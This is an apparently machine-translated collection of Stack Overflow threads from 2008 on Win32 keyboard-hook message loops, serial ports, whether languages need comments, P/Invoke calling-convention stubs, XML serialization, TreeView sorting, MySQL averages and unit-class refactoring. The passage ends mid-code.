文件上传后，您需要进行验证和导入。您可以使用 ADO.NET、文件流、DTS/SSIS 或 Office 自动化来执行此操作（如果您使用的是 Microsoft 堆栈）。在验证部分，您应该准确地告诉用户*他们*做错了什么或需要更改。这可能包括让验证页面在数据网格中包含实际数据，并在确切的行/列上提供带有错误的红色标签。如果你使用 Office 自动化，你可以给他们准确的手机号码，但 Office PIA 是一件让人头疼的事情。

接受验证后，您可以随意导入信息。我更喜欢将它放入临时表并使用存储的过程来加载它，但这只是我。有些人更喜欢使用对象模型，但如果您有大量数据，这可能会非常慢。

如果您亲自手动加载这些文件并且必须进入并操作它们，我建议您找到它们之间的共同点并提出一个可以遵循的标准。一旦你有了它，你就可以做到，这样用户就可以自己做，或者你可以自己做的更快。

是的，这需要做很多工作，但从长远来看，当有一个程序在 95% 的情况下都有效时，每个人都会获胜。

如果这将是一种无法自动化的情况，那么您可能只需要一个 vanilla staging 表并使用 sql 来导入。您必须将数据加载到一个暂存表中，进行基本操作，然后将其加载到 SQL 期望的测试暂存表中。

我做了这么多导入和 ETL 工具，确实没有简单的方法来处理它。唯一的方法是真正提出一个合理的标准，并坚持下去并围绕它进行规划。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-24T09:44:23.930

DSL是要走的路。

为您的问题创建域模型。您谈论单元格、列、行、数据库表、拆分字段、组合字段、从单元格到数据库列的映射，这就是您需要的概念。此外，您可能需要范围（单元格）和工作表。

简单视图仅查看电子表格中的值，而不查看基础公式。将电子表格导出为制表符分隔的文本可让您访问它。如果您需要访问公式，最好使用 xml 表示形式，XML 电子表格或 Office XML 格式。

您也许可以在 Excel 中提出 DSL。这可以让您更聪明的用户进行（部分）映射。

# c++ - 防止无形应用程序因键盘挂钩而关闭

> ID：390789
> 
> 赞同：1
> 
> 时间：2008-12-24T05:02:09.507
> 
> 标签：c++, winapi, keyboard, hook

我正在开发一个涉及键盘挂钩的 c++ win32 程序。该应用程序是一个没有任何用户界面的 win32 项目。我需要阻止应用程序关闭而不使用导致挂钩不起作用或耗尽大量系统资源。我曾经使用消息框，但我需要应用程序完全不可见。

任何帮助，将不胜感激！

如果你有问题，就问吧。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-12-24T09:35:26.240

我认为您需要的是[仅消息窗口](http://msdn.microsoft.com/en-us/library/ms632599(VS.85).aspx#message_only)

> （***MSDN 说***）只有消息的窗口使您能够发送和接收消息。它不可见，没有 z 顺序，无法枚举，并且不接收广播消息。窗口只是发送消息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2010-12-10T15:40:29.830

你真的需要窗户吗？[MSDN LowLevelKeyboardProc 页面](http://msdn.microsoft.com/en-us/library/ms644985%28v=vs.85%29.aspx)建议使用简单的消息循环。只需在钩子调用之后插入此代码段即可。

```
// message loop to keep the keyboard hook running
MSG msg;
while(GetMessage(&msg, NULL, 0, 0) > 0)
{
    TranslateMessage(&msg);
    DispatchMessage(&msg);
} 
```

* * *

## 回答 #3

> 赞同：-3
> 
> 时间：2008-12-24T06:43:24.920

更好的方法是添加一个不断循环的循环。

```
bool shouldExit = false;

do
{
   //some code to handle events
   shouldExit = handleEvents();

   //sleep for a small bit so we dont take up 100% cpu
   sleep(500);
}
while (!shouldExit); 
```

# visual-c++ - 设置串口读取数据的格式？

> ID：390792
> 
> 赞同：-1
> 
> 时间：2008-12-24T05:03:00.567
> 
> 标签：visual-c++, visual-c++-6

通过串行端口读取数据时。我想知道从端口传来的数据是什么格式的？wheathr ASCII、十进制或十六进制或以字节为单位，

请任何博比给出提示

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-24T05:35:17.770

使用 HyperTerminal 或 TeraTerm 等终端程序查看串行设备的输出。您可以使用这些软件建立从 PC 到设备的连接，然后检查屏幕上的输出以确定数据格式。

另请查看制造商手册，他们通常会详细说明数据格式以及串行端口连接详细信息（波特率等）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-24T06:10:50.383

ByteSize 只是设备制造商选择在设备输出的每 BYTE 数据中使用的位数。通常他们使用 7 或 8：范围本身限制为 5、6、7 或 8。

所以无论 ASCII、HEX 格式如何，都会有这个 BYTE 流。例如，您可以使用每字节 5、6、7 或 8 位中的任何一个来使用 ASCII 或 HEX 格式。

这就是为什么人们应该查看制造商手册或尝试使用超级终端查看该数据格式的原因。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-24T05:41:52.233

这取决于您如何配置串行端口以连接设备：数据长度（字节大小）是决定要接收的数据以及设备如何传输的属性之一

DCB 结构如下所示：

DWORD 波特率：速度

BYTE StopBits：0,1,2 = 1, 1.5, 2（默认值 = 0）

BYTE Parity：0-4= 无、奇、偶、标记、空格（默认 = 0）

BYTE ByteSize：位数/字节，4-8（默认 = 8）

最后一个决定数据流，所有其他决定连接性..

# language-agnostic - 编程语言需要注释吗？

> ID：390797
> 
> 赞同：25
> 
> 时间：2008-12-24T05:07:39.887
> 
> 标签：language-agnostic, comments

在对克林贡语言进行了一些愚蠢的思考之后，来自这篇[文章的](https://stackoverflow.com/questions/304564/is-there-a-good-k-kode-editor-for-klingon)我开始了一个愚蠢的爱好项目，创建一种可编译为 Lua 字节码的克林贡编程语言。在最初的语言设计阶段，我查找了有关[克林贡程序员](http://gradha.sdf-eu.org/textos/klingon_programmer.en.html)的信息，并发现了以下克林贡编程规则：

> **真正的克林贡战士不会评论他的代码！**

所以我决定我的语言**不支持评论**，因为任何好的克林贡语都不会使用它们。

现在，对于我们人类程序员来说，许多克林贡方式似乎并不合理，但是在涉足我的爱好语言的设计和实现时，我开始意识到这条关于评论的克林贡规则确实非常合理，即使不是很好。

从编程语言中删除评论的能力意味着我必须编写**有文化的****代码**，没有例外。

所以这让我想知道是否有任何语言不支持评论？

是否有任何真正好的论据可以不从语言中删除评论？

编辑：需要任何好的评论示例吗？

* * *

PS> 反正我上面的爱好语言有点傻，所以不要太关注我的实现，和一般需要的注释概念一样

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2008-12-24T05:27:19.473

不要评论你在做什么，而要评论你为什么这样做。

WHAT 由干净、易读和简单的代码处理，并选择适当的变量名来支持它。注释显示代码本身不能（或难以）显示的更高级别的代码结构。

* * *

## 回答 #2

> 赞同：23
> 
> 时间：2008-12-24T05:19:03.637

我不确定我是否同意“从编程语言中删除评论的能力意味着我必须编写有文化的代码，没有例外”这句话中的“拥有”，因为并不是所有代码都被记录在案。我的猜测是大多数人会编写不可读的代码。

更重要的是，我个人不相信实际世界中不言自明的程序或 API 的现实。

我为我的论文手动分析整个 API 文档的经验表明，您经常需要携带比仅在签名中传达的信息更多的信息。如果您从您的语言中删除界面注释，还有哪些替代方案？没有文档不是一种选择。外部文档不太可能被阅读。

至于内部文档，我可以理解您希望减少文档以说服人们写得更好的观点。但是，评论服务于许多协作和协调目的，旨在提高对事物的认识。通过将这些细节放逐到外部位置，您正在减少它们进入未来读者意识的机会，除非您的工具很棒。

* * *

## 回答 #3

> 赞同：13
> 
> 时间：2008-12-24T06:00:33.680

呃，在测试期间不能快速注释掉一行（或多行）对我来说听起来很烦人，尤其是在编写脚本时。

* * *

## 回答 #4

> 赞同：9
> 
> 时间：2008-12-24T05:21:36.643

一般来说，评论是一个表明设计不佳的疣，特别是冗长的漫无边际的评论，其中很明显开发人员不知道他们到底在做什么，并试图通过写评论来弥补它。

评论有用的地方：

*   在修复旁边留下票号，以便未来的程序员可以了解业务需求
*   解释一个特别棘手的 hack
*   一段代码的业务逻辑注释
*   API 文档中的简洁描述，以便第三方可以使用您的 API

在任何情况下，程序员都应该努力编写描述性的代码，而不是编写描述写得不好的代码的注释。话虽如此，我认为语言应该而且必须支持评论有很多正当理由。

* * *

## 回答 #5

> 赞同：7
> 
> 时间：2008-12-24T05:24:58.650

您的代码有两种不同的受众：

*   编译器
*   像我们这样的人类

如果您选择完全删除注释，那么您所采取的假设是您将只为编译器提供服务，而不是其他任何内容。

当然，作为克林贡人，您可能不需要评论，因为您不是人类。也许您可以通过在 IL 中讲话来清楚地向我们展示您的能力？

* * *

## 回答 #6

> 赞同：5
> 
> 时间：2008-12-24T07:43:35.187

您的代码中*不需要*单个断言，因为在发布模式下，它们都消失了。但是当 C++ 没有内置断言时，有人编写了断言宏来替换它。

当然，出于或多或少相同的原因，您也不*需要评论。*但是如果你设计一种没有注释的语言，人们会开始做这样的事情：

```
HelperFunctionDoesNothing("This is a comment! Blah Blah Blah..."); 
```

* * *

## 回答 #7

> 赞同：4
> 
> 时间：2008-12-24T08:26:42.107

我很好奇。你如何阻止某人声明一个包含注释的静态字符串，然后忽略 func/method/procedure/battle/whatever 的其余部分的变量？

```
var useless_comment = "Can we destroy our enemies?"
if (phasers on full) return Qapla' 
```

* * *

## 回答 #8

> 赞同：3
> 
> 时间：2008-12-24T05:17:51.037

语言需要注释。至少 95% 的注释可以用更清晰的代码代替，但仍然存在需要记录的假设，如果您正在解决一些外部问题，您绝对需要记录。

我从来不会在没有首先考虑我是否可以更改代码以消除对它的需要的情况下写评论，但有时你不能。

* * *

## 回答 #9

> 赞同：3
> 
> 时间：2008-12-24T07:30:12.140

虽然默认情况下所有源代码都受版权保护。通常很高兴：

1.  提醒阅读源代码的人它受版权保护

2.  告诉人们该源代码文件的许可条款是什么

3.  告诉他们是否正在查看受保护的商业秘密

不幸的是，没有评论，很难做到这一点。

* * *

## 回答 #10

> 赞同：3
> 
> 时间：2008-12-24T09:33:00.803

我是唯一一个出于多种目的注释掉几行**代码的人吗？**

* * *

## 回答 #11

> 赞同：3
> 
> 时间：2009-07-06T22:27:35.700

制作一种无法发表评论的语言会比你想象的更难。

```
if (false) {
    print("This is a comment. Chew on that, Klingons!")
} 
```

* * *

## 回答 #12

> 赞同：2
> 
> 时间：2008-12-24T05:27:25.853

虽然人类确实需要能够对代码进行注释，但语言直接支持注释并不是绝对必要的：对于大多数语言来说，编写一个删除一行注释的脚本（例如，所有以'#' 或其他字符）然后运行编译器。

但实际上，我很惊讶和失望地得知，即使是我最喜欢的深奥编程语言也支持注释：[Brainf**k](http://www.muppetlabs.com/~breadbox/bf/)和[Whitespace](http://compsoc.dur.ac.uk/whitespace/)。这些语言很难阅读，因此它们似乎不应该支持评论。（与我最喜欢的其他深奥语言相反：[LOLCode](http://lolcode.com/)，它是自我记录的，在 lolcats-speech 中）

在这一点上，我会与其他回答者持不同意见：我说，忠于你对克林贡编程语言的愿景，不支持评论！

* * *

## 回答 #13

> 赞同：2
> 
> 时间：2008-12-24T05:39:23.690

反对意见的一点是，它们往往与代码过时。任何时候添加冗余，都会冒着这种不一致的风险。

实际上，当一个小组使用 NLP 分析一些大型系统中的锁定注释，然后将它们与静态分析的结果进行比较并能够通过这种方式修复一些错误时，我实际上看到了一些有趣的研究。

* * *

## 回答 #14

> 赞同：2
> 
> 时间：2008-12-24T06:27:16.153

识字编程不是和代码一样多的评论吗？当然，我所看到的关于文学编程的大部分内容都有与代码一样多的解释，如果不是更多的评论的话。

* * *

## 回答 #15

> 赞同：1
> 
> 时间：2008-12-24T05:11:15.837

您可能认为使用您的语言编写代码的开发人员会付出额外的努力来编写清晰的代码，但实际上**您**有责任设计一种表达力如此之强*以至于*不需要注释的语言。见鬼，甚至英语也不是那样的（我们仍然加括号！）。如果你的语言不是这样设计的，它很可能和 Brainfuck 一样可用，并享受 Brainfuck 的流行和尊重。

我应该添加链接还是链接被视为commentlike？

此外，如果需要，人们会通过劫持字符串和滥用变量名（除了代替评论之外什么都不做）来找到添加评论的方法。你读过*哥德尔·埃舍尔·巴赫*吗？

* * *

## 回答 #16

> 赞同：1
> 
> 时间：2008-12-24T05:29:02.073

完全删除评论功能将是一个坏主意。当然，开发人员必须学会用最少的注释编写代码，即编写自我记录的代码，但是在很多情况下，人们必须解释为什么要以这种方式完成某件事。考虑以下情况：

*   新的开发人员可能会开始维护代码，而原来的开发人员已经离开/退出项目
*   规格或市场需求的变化会导致一些违反直觉的事情
*   版权声明，尤其是在开源时（某些开源库要求您这样做）

我的经验也是，新程序员倾向于发表更多评论，并且随着他们发展专业知识，他们的代码往往会自我记录和简洁。一般来说，评论应该是关于为什么而不是如何或什么。

* * *

## 回答 #17

> 赞同：1
> 
> 时间：2008-12-24T05:38:01.727

不——没有一种编程语言需要注释。

该语言适用于计算机。评论是针对人类的。您可以编写一个带有 0% 注释的程序。它会正确或错误地执行。你不能编写一个有 100% 评论的程序。它要么不能编译——没有 main() 等——或者，对于脚本语言，什么也不做。

此外，[真正的程序员不会评论他们的代码](http://www.pbm.com/~lindahl/real.programmers.html)。就像克林贡人一样。

* * *

## 回答 #18

> 赞同：1
> 
> 时间：2008-12-24T06:24:27.250

虽然我同意 Uri 的回答，但我也发表了一种没有评论的语言。( [ichbins](http://www.accesscom.com/~darius/hacks/ichbins.tar.gz) .) 语言要尽可能简单，同时仍然能够清晰地表达自己的编译器；因为你可以在没有评论的情况下这样做，所以他们被抛弃了。

我正在不断地研究一个支持注释的修订版，但有点不同：文字编程风格，代码嵌套在文本中，而不是注释嵌入代码中。它还可能在以后获得示例/测试用例作为一流的语言功能。

祝克林贡黑客攻击好运。:-)

* * *

## 回答 #19

> 赞同：1
> 
> 时间：2008-12-24T06:28:02.657

我无法告诉您我对 Javadoc 的感激之情——在评论中设置它真的很简单。所以这至少是评论有用的一种意义。

* * *

## 回答 #20

> 赞同：1
> 
> 时间：2008-12-24T07:03:23.693

不，当然一种语言不必有评论。但是一个（有用的）程序确实必须有注释......我不同意你认为识字代码缺乏注释的想法。一些非常好的代码很容易通过注释理解，但如果没有注释则很难理解。

* * *

## 回答 #21

> 赞同：1
> 
> 时间：2008-12-24T09:32:48.947

我认为在许多情况下都需要评论。

例如，想想算法的。假设有一个用 C 语言编写的函数来解决[旅行推销员问题](http://en.wikipedia.org/wiki/Traveling_salesman_problem)，那么可以使用多种技术来处理这个问题。而且这些代码本质上通常是神秘的。

如果不明确描述所使用的参数和算法，通过使用注释，几乎不可能重用这段代码。

* * *

## 回答 #22

> 赞同：1
> 
> 时间：2008-12-24T10:34:54.623

我们可以在没有代码评论的情况下生活吗？当然可以，但这不会让生活更轻松。

* * *

## 回答 #23

> 赞同：1
> 
> 时间：2009-07-06T22:22:31.543

注释很有用，因为它们可以让阅读您的代码的人（可能是“未来的你”）放心，您已经考虑过她的福利。

* * *

## 回答 #24

> 赞同：0
> 
> 时间：2008-12-24T05:17:07.260

我认为问题可能变成没有评论的语言会如何独立？例如，如果它编译为在其他代码中使用的 DLL，那么人们如何知道函数签名之外的任何内容，包括它需要什么、更改和返回？我不希望函数名称包含几十个字符，以试图表达可以通过函数上方的注释轻松完成的操作，这些注释可以用作诸如 Visual Studio 中的对象浏览器之类的文档中的文档。

* * *

## 回答 #25

> 赞同：0
> 
> 时间：2008-12-24T05:30:33.710

当然！！

主要原因是新手开发人员。不是每个人都知道如何编写有文化的代码。实际上，有数百万人在看到 NullPointerException 时没有得到。

我们都从某个时间点开始。

但是，如果您只针对“专家”开发人员，那么为什么要首先在语言上费心呢。你应该[使用蝴蝶](http://xkcd.com/378/)！这就是真正的开发人员使用的！

评论是必须的，如果你愿意，试着让它变得更难（比如使用 #//##/ 序列来创建评论或类似的东西）但不要遗漏它。

:)

* * *

## 回答 #26

> 赞同：0
> 
> 时间：2008-12-24T06:19:18.273

> 编程语言需要注释吗？

不。在事物的宏大计划中，编译器不会关心评论，只是希望代码磨成较低的公分母。

> 编程语言提供注释结构有用吗？

是的。注释对程序员来说非常有用，不仅可以假装他们知道自己在做什么，还可以用于调试和有用的文档记录。

* * *

## 回答 #27

> 赞同：0
> 
> 时间：2008-12-24T06:27:22.003

我同意你的观点，写得很好的代码不需要任何评论，因为“代码只是程序员可以使用的好的文档。但是这是非常理想的条件，并不是每个人都能一直写好的代码。因此，为了让写得不好的代码在未来的评论中变得更好，必需的。

* * *

## 回答 #28

> 赞同：0
> 
> 时间：2008-12-24T06:58:20.257

我曾经写过一个 VB 应用程序（一个受大富翁启发的愚蠢棋盘游戏），没有*任何*评论。但我这样做只是为了激怒我的老师，他告诉我们评论是针对“我们认为*相关*的任何内容，以便我们以后记住”。

* * *

## 回答 #29

> 赞同：0
> 
> 时间：2008-12-24T09:35:52.013

完美的代码需要零注释。它应该很简单，并且完全新手可以理解。

* * *

## 回答 #30

> 赞同：0
> 
> 时间：2008-12-24T10:01:34.613

任何代码都需要注释，我尝试用 1 或 2 行来解释我编写的每个函数的原因和工作原理。

解释自己的代码只存在于一个完美的世界中，总是有一些奇怪的黑客或理由去做一些快速而不是正确的事情而不是正确的方式。最好记住的是注释为什么代码会做什么，好的代码解释了它在 99% 的时间里做什么。

写一些简单的东西，比如一段可以解决数独难题的代码（3 个相当简单的 while 循环），然后在 3 个月后尝试阅读。你会立即发现一些不太清楚的东西。

* * *

## 回答 #31

> 赞同：0
> 
> 时间：2008-12-26T06:11:42.003

代码只写一次，但在其生命周期中被多次阅读；因此，优化可读性是值得的。对从常量到类的所有内容进行清晰一致的命名是必要的，但可能不足以实现这一目标。如果没有，请用注释填补空白，并像维护代码一样维护它们。

* * *

## 回答 #32

> 赞同：0
> 
> 时间：2021-02-10T03:50:43.580

如果您不需要，为什么该语言的开发人员会添加注释。评论很有​​用。想象一下测试你的代码在一个函数中出现错误你必须删除整个函数而没有备份如果我是你我只会评论这个函数以使编译器避免它如果我在发布日期之前获得该函数的新替代方案我将删除该功能。否则我会开始打印调试代码，看看函数的哪一部分是问题所在。

# c# - P/Invoke 和 C# 的自定义调用约定

> ID：390798
> 
> 赞同：2
> 
> 时间：2008-12-24T05:09:15.217
> 
> 标签：c#, pinvoke, calling-convention

我有一个商业案例，我需要能够在使用 P/Invoke 时指定我自己的调用约定。具体来说，我有一个使用非标准 ABI 的旧版 dll，我需要能够为每个函数指定调用约定。

例如，此 dll 中的一个函数通过 EAX 和 EBX 接受其前两个参数，其余通过堆栈接受。另一个函数通过 ECX 接受一个参数，其余的在堆栈中。我有几百个这样的函数，并且想避免编写我自己的中间桥 DLL 来访问这些函数。

我的另一个选择是手动滚动我自己的自定义 P/Invoke，这显然是不可取的。

任何帮助表示赞赏，谢谢，

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-12-26T13:26:05.713

我不明白您对自定义 P/Invoke 的意思，但我看不出如果没有非托管 C++ 和内联汇编，您将如何摆脱困境。但是，由于几乎所有内容都作为 32 位值传递，因此您可能会为每个函数签名只编写一个代理，而每个函数只编写一个代理。或者您可以编写一个从 XML 生成代理的代码生成器。不过，我看不出这个版本太不受欢迎，因为所有代理功能都非常简单：

```
int RealFunction(int param1, const char * param2, char param 3);

int MyFunction(int param1, int param2, int param3) { // argument types do not matter as long as they are not doubles or structures
   __asm {
      mov eax, param1
      mov ebx, param2
      push param3
      call RealFunction
      ; depending on calling convention, you might need to do add esp, 12 here
      ; if RealFunction does not return its result in eax, you will need to do mov eax, <wherever the return value is> here
   }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-24T18:29:21.827

我相当确定没有单独的 dll 就没有内置的方式来完成你想要的。除了运行时系统支持的内容之外，我还没有看到指定调用约定的方法。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2010-06-26T01:12:51.203

不久前我正在学习调用约定，并编写了一些代码来转换调用约定。代码从一个特殊的 C# 包装器中调用，包装器库使用反射发射（无法让 Marshal.getdelegateforfunctionpointer 工作）为特殊的裸存根方法发射一个新的 p/invoke 方法。它修复了参数，然后调用实际方法。

这是c代码。我没有方便的 C# 部分:(当时我也在学习汇编程序，所以代码可能很烂:)

```
typedef struct
{
    USHORT ParameterOneOffset;  // The offset of the first parameter in dwords starting at one
    USHORT ParameterTwoOffset;  // The offset of the second parmaeter in dwords starting at one
} FastCallParameterInfo;

    __declspec( naked,dllexport ) void __stdcall InvokeFast()
{
    FastCallParameterInfo paramInfo;
    int functionAddress;
    int retAddress;
    int paramOne, paramTwo;
    __asm
    {
        // Pop the return address and parameter info.  Store in memory.
        pop retAddress;
        pop paramInfo;
        pop functionAddress;

        // Check if any parameters should be stored in edx                          
        movzx ecx, paramInfo.ParameterOneOffset;     
        cmp ecx,0;
        je NoRegister;  

        // Calculate the offset for parameter one.
        movzx ecx, paramInfo.ParameterOneOffset;    // Move the parameter one offset to ecx
        dec ecx;                                    // Decrement by 1
        mov eax, 4;                                 // Put 4 in eax
        mul ecx;                                    // Multiple offset by 4

        // Copy the value from the stack on to the register.
        mov ecx, esp;                               // Move the stack pointer to ecx
        add ecx, eax;                               // Subtract the offset.
        mov eax, ecx;                               // Store in eax for later.
        mov ecx, [ecx];                             // Derefernce the value
        mov paramOne, ecx;                          // Store the value in memory.

        // Fix up stack
        add esp,4;                                  // Decrement the stack pointer
        movzx edx, paramInfo.ParameterOneOffset;    // Move the parameter one offset to edx
        dec edx;                                    // Decrement by 1
        cmp edx,0;                                  // Compare offset with zero
        je ParamOneNoShift;                         // If first parameter then no shift.

    ParamOneShiftLoop:
        mov ecx, eax;
        sub ecx, 4;
        mov ecx, [ecx]
        mov [eax], ecx;                             // Copy value over
        sub eax, 4;                                 // Go to next 
        dec edx;                                    // decrement edx
        jnz ParamOneShiftLoop;                      // Loop
    ParamOneNoShift:
        // Check if any parameters should be stored in edx                          
        movzx ecx, paramInfo.ParameterTwoOffset;     
        cmp ecx,0;
        je NoRegister;  

        movzx ecx, paramInfo.ParameterTwoOffset;    // Move the parameter two offset to ecx
        sub ecx, 2;                                 // Increment the offset by two.  One extra for since we already shifted for ecx
        mov eax, 4;                                 // Put 4 in eax
        mul ecx;                                    // Multiple by 4

        // Copy the value from the stack on to the register.
        mov ecx, esp;                               // Move the stack pointer to ecx
        add ecx, eax;                               // Subtract the offset.
        mov eax, ecx;                               // Store in eax for later.
        mov ecx, [ecx];                             // Derefernce the value
        mov paramTwo, ecx;                          // Store the value in memory.           

        // Fix up stack
        add esp,4;                                  // Decrement the stack pointer
        movzx edx, paramInfo.ParameterTwoOffset;    // Move the parameter two offset to ecx
        dec edx;                                    // Decrement by 1
        cmp edx,0;                                  // Compare offset with zero
        je NoRegister;                              // If first parameter then no shift.
    ParamTwoShiftLoop:
        mov ecx, eax;
        sub ecx, 4;
        mov ecx, [ecx]
        mov [eax], ecx;                             // Copy value over
        sub eax, 4;                                 // Go to next 
        dec edx;                                    // decrement edx
        jnz ParamTwoShiftLoop;                      // Loop

    NoRegister:
        mov ecx, paramOne;                          // Copy value from memory to ecx register
        mov edx, paramTwo;                          // 
        push retAddress;
        jmp functionAddress;
    }
} 
```

# c# - 有没有办法将对象（及其属性）序列化为 xml？

> ID：390800
> 
> 赞同：1
> 
> 时间：2008-12-24T05:11:55.383
> 
> 标签：c#, .net, xml-serialization

创建一个类（称为 FormElement）。该类应该具有一些属性，例如它们具有数据元素的元数据（名称、序列号、值——它只是一个字符串等）。

此类具有类型验证应用程序块验证类的属性。

我想将它序列化为 xml 并反序列化它。验证包括验证应用程序块属性在内的类的所有属性在序列化过程中是否存在。

一些建议？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-12-26T16:06:31.020

.NET 框架内置了这个，使用 C# 你可以这样做：

```
// This code serializes a class instance to an XML file:
XmlSerializer xs = new XmlSerializer(typeof(objectToSerialize));

using (TextWriter writer = new StreamWriter(xmlFileName))
{
     xs.Serialize(writer, InstanceOfObjectToSerialize);
} 
```

这个片段是如何将 XML 文件反序列化回类实例的示例：

```
// this code creates a class instance from the file we just made:
objectToSerialize newObject;
XmlSerializer xs = new XmlSerializer(typeof(objectToSerialize));

using (TextReader reader = new StreamReader(xmlFileName))
{
    newObject = (ObjectToSerialize) xs.Deserialize(reader);
} 
```

您必须使用 [Serializable] 属性标记您的类，这些属性才能正常工作。如果你想让你的 XML 输出更漂亮一点，你可以在你的类属性上使用 [XmlElement] 和 [XmlAttribute] 属性来让它们序列化到你选择的模式中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-24T05:22:57.360

说serialize，是指使用官方的Serialization机制，还是达到类似的效果？

如果您的对象是 bean，您可以使用反射来编写一个通用服务，该服务接受一个类并记下其类名和属性。它可以类似地从 XML 中读取材料并生成对象（这是 Apache Digester 本质上所做的）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-26T16:34:00.123

乔纳森·霍兰德所说的。

但是，您还询问了验证。如果您使用 Jonathan 发布的代码，您的所有属性*都将*正确序列化和反序列化。但是，如果您真的想检查它，您可以使用您的 XmlSerializer 对象设置一个属性，以便验证 *.xsd 架构。`xsd.exe`您可以使用Visual Studio 附带的命令行工具从您的类中轻松地创建架构。

此外，听起来您可能想要控制类的某些属性是否被序列化为属性或元素。Jonathon 谈到了这一点，但我想举一个例子：

```
[Serializable]
public class FormElement
{
   [XmlAttribute]
   public string Name {get; set;};

   [XmlAttribute]
   public int Sequence {get; set;};

   [XmlAttribute]
   public string Value {get; set;};

   [XmlElement]
   public Validation OnValidate{get; set;}

   [NonSerialized]
   public string UnimportantProperty {get; set;};

} 
```

最后，要序列化的每个属性的类型也必须是可序列化的，复杂类型必须序列化为 XmlElements。否则你将无法做到。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2008-12-24T05:38:11.900

[XStream](http://xstream.codehaus.org/)是一个非常好的 Java 库，可以做到这一点。

# .net - 添加节点时自动对 TreeView 进行排序

> ID：390802
> 
> 赞同：8
> 
> 时间：2008-12-24T05:12:27.067
> 
> 标签：.net, winforms, sorting, treeview

有没有一种简单的方法可以将节点添加到 WinForms .NET TreeView 控件，其中正在添加的新节点插入到正确的索引处，以便整个节点列表按字母顺序排序？结果几乎与`TreeView.Sort()`.

我有一个不断增长到几百个节点的 TreeView。用户可以随着它的增长实时查看这个 TreeView。我宁愿只在正确的索引处插入节点，而不是每次添加节点后调用 TreeView.Sort() 。

这可以做到吗？

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2008-12-24T05:46:01.603

在 winforms 中，您可以简单地将 TreeView 的`.Sorted`属性设置为`True`.

> 当 Sorted 设置为 true 时，TreeNode 对象按其 Text 属性值的字母顺序排序。将大量项目添加到已排序的 TreeView 时，应始终使用 BeginUpdate 和 EndUpdate 来保持性能。当现有节点的文本发生更改时，您必须调用 Sort 来重新排序这些项目。

参考[MSDN](http://msdn.microsoft.com/en-us/library/system.windows.forms.treeview.sorted.aspx)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2008-12-24T05:34:37.070

为什么不创建继承自`TreeView`和的新类`TreeNodeCollection`？new`TreeView`将使用您的 new `TreeNodeCollection`，您可以覆盖 the 的`Add()`方法`TreeNodeCollection`来执行您的建议。

该方法必须： 1\. 找到要插入的正确位置和 2\. 插入新节点。

最简单的实现将遍历集合直到`thisNode.value<=newNode.value<nextNode.value`. 然后插入之前`nextNode.Index`。如果您使用不同的搜索算法，您可能会看到性能提升，具体取决于集合的大小。（想到类似二进制搜索的东西。）

`TreeNodeCollection`注意：您也可以在做同样事情的a 上创建一个扩展方法。但是，覆盖该`Add()`方法可确保您`TreeView`始终*排序*。`AddIntoSorted()`如果在调用之前尚未对扩展方法进行排序，则仅创建扩展方法可能会导致未定义的结果。

# mysql - MySQL自动生成统计框架数据

> ID：390814
> 
> 赞同：0
> 
> 时间：2008-12-24T05:25:31.237
> 
> 标签：mysql, average

我有一个包含日期、距离和 TimeForDistance 的表...

有没有办法使用 MySQL 语句计算平均每月速度？

任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2008-12-24T05:30:51.070

我想你正在寻找这样的东西：

```
SELECT
    YEAR(my_date) as my_year, 
    MONTH(my_date) as my_month, 
    sum(Distance) / sum(TimeForDistance) AS velocity 
FROM your_table 
GROUP BY my_year, my_month
ORDER BY my_year, my_month 
```

# c# - 重构；为您的应用程序域创建伪基元

> ID：390819
> 
> 赞同：1
> 
> 时间：2008-12-24T05:27:55.757
> 
> 标签：c#

你将如何重构它，记住你还有几十个这样的测量值要表示？这有点像将 int 更改为 short 或 long 或 byte。通用`unit<T>`？通过运算符重载进行隐式类型转换？`ToType()`图案？抽象基类？`IConvertible`?

```
public class lb
{
    private readonly float lbs;
    private readonly kg kgs;

    public lb(float lbs)
    {
        this.lbs = lbs;
        this.kgs = new kg(lbs * 0.45359237F);
    }

    public kg ToKg()
    {
        return this.kgs; 
    }

    public float ToFloat()
    {
        return this.lbs;
    }
}

public class kg 
{
    private readonly float kgs;
    private readonly lb lbs;

    public kg(float kgs)
    {
        this.kgs = kgs;
        this.lbs = new lb(kgs * 2.20462262F);
    }

    public float ToFloat()
    {
        return this.kgs;
    }

    public lb ToLb()
    {
        return this.lbs;
    }
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-12-24T06:30:19.860

我不会为每个重量创建单独的类。相反，有一个类代表一个单位，另一个类代表一个带有单位的数字：

```
/// <summary>
/// Class representing a unit of weight, including how to
/// convert that unit to kg.
/// </summary>
class WeightUnit
{
    private readonly float conv;
    private readonly string name;

    /// <summary>
    /// Creates a weight unit
    /// </summary>
    WeightUnit(float conv, string name)
    {
        this.conv = conv;
        this.name = name;
    }

    /// <summary>
    /// Returns the name of the unit
    /// </summary>
    public string Name { get { return name; } }

    /// <summary>
    /// Returns the multiplier used to convert this
    /// unit into kg
    /// </summary>
    public float convToKg { get { return conv; } }
};

/// <summary>
/// Class representing a weight, i.e., a number and a unit.
/// </summary>
class Weight
{
    private readonly float value;
    private readonly WeightUnit unit;

    public Weight(float value, WeightUnit unit)
    {
        this.value = value;
        this.unit = unit;
    }

    public float ToFloat()
    {
        return value;
    }

    public WeightUnit Unit
    {
        get { return unit; }
    }

    /// <summary>
    /// Creates a Weight object that is the same value
    /// as this object, but in the given units.
    /// </summary>
    public Weight Convert(WeightUnit newUnit)
    {
        float newVal = value * unit.convToKg / newUnit.convToKg;

